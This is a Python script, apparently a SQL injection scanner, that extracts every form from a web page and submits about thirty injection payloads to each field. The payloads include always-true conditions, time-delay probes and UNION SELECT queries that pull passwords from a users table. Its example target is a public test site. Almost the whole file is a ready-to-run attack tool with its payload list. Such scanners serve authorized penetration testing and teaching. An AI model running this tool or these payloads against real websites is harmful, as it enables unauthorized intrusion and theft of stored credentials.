from urllib.parse import urljoin
import requests
from bs4 import BeautifulSoup as bs

# Initialize a session
s = requests.Session()

def get_forms(url):
    """Extract all form tags from the URL's HTML content."""
    res = s.get(url)
    soup = bs(res.content, "html.parser")
    return soup.find_all("form")

def form_details(form):
    """Extract form details such as action, method, and input fields."""
    details = {}
    action = form.attrs.get("action").lower()
    method = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        input_value = input_tag.attrs.get("value", "")
        inputs.append({"type": input_type, "name": input_name, "value": input_value})
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details

def vulnerable(response):
    """Determine if the response indicates a vulnerability."""
    errors = {
        "you have an error in your sql syntax",
        "warning: mysql",
        "unclosed quotation mark after the character string",
        "quoted string not properly terminated",
    }
    for error in errors:
        if error in response.content.decode().lower():
            return True
    return False

def sql_injection_scan(url):
    forms = get_forms(url)
    print(f"[+] Detected {len(forms)} forms on {url}.")

    payloads = [
        "' OR 1=1 --",
        "' OR 1=0 --",
        "' OR 'a'='a' --",
        "' OR 'a'='b' --",
        "' OR 1=1 and 'a'='a' --",
        "' OR 1=0 and 'a'='b' --",
        "' OR sleep(5) --",
        "' OR benchmark(99999999,md5('test')) --",
        "' UNION SELECT * FROM users --",
        "' UNION SELECT NULL,NULL,password FROM users --",
        "' AND 1=(SELECT COUNT(*) FROM users WHERE username='admin') --",
        "' AND 1=(SELECT COUNT(*) FROM users WHERE username='admin' AND password='' OR 1=1) --",
        "' AND 1=(SELECT COUNT(*) FROM users WHERE username='admin' AND password=MD5('test')) --",
        "' AND 1=(SELECT COUNT(*) FROM users WHERE username='admin' AND password=SHA1('test')) --",
        "' AND 1=(SELECT COUNT(*) FROM users WHERE username='admin' AND password=CRYPT('test')) --",
        "') OR 1=1 --",
        "') AND 1=1 --",
        "') AND 'a'='a' --",
        "') AND 'a'='b' --",
        "') AND 1=1 and 'a'='a' --",
        "') AND 1=0 and 'a'='b' --",
        "') OR sleep(5) --",
        "') OR benchmark(99999999,md5('test')) --",
        "') UNION SELECT * FROM users --",
        "') UNION SELECT NULL,NULL,password FROM users --",
        "') AND 1=(SELECT COUNT(*) FROM users WHERE username='admin') --",
        "') AND 1=(SELECT COUNT(*) FROM users WHERE username='admin' AND password='' OR 1=1) --",
        "') AND 1=(SELECT COUNT(*) FROM users WHERE username='admin' AND password=MD5('test')) --",
        "') AND 1=(SELECT COUNT(*) FROM users WHERE username='admin' AND password=SHA1('test')) --",
        "') AND 1=(SELECT COUNT(*) FROM users WHERE username='admin' AND password=CRYPT('test')) --",
    ]

    for form in forms:
        details = form_details(form)

        for payload in payloads:
            data = {}
            for input_tag in details["inputs"]:
                if input_tag["type"] == "hidden" or input_tag["value"]:
                    data[input_tag['name']] = input_tag["value"] + payload
                elif input_tag["type"] != "submit":
                    data[input_tag['name']] = f"test{payload}"

            # Construct the full URL (if the form action is relative)
            target_url = urljoin(url, details["action"])
            print(f"Submitting to {target_url} with payload {payload}")

            if details["method"] == "post":
                res = s.post(target_url, data=data)
            elif details["method"] == "get":
                res = s.get(target_url, params=data)

            if vulnerable(res):
                print(f"SQL injection attack vulnerability detected in form at: {url}")
                break
            else:
                print(f"No SQL injection attack vulnerability detected for payload: {payload}")

# Example usage
url = "http://testphp.vulnweb.com"
sql_injection_scan(url)
 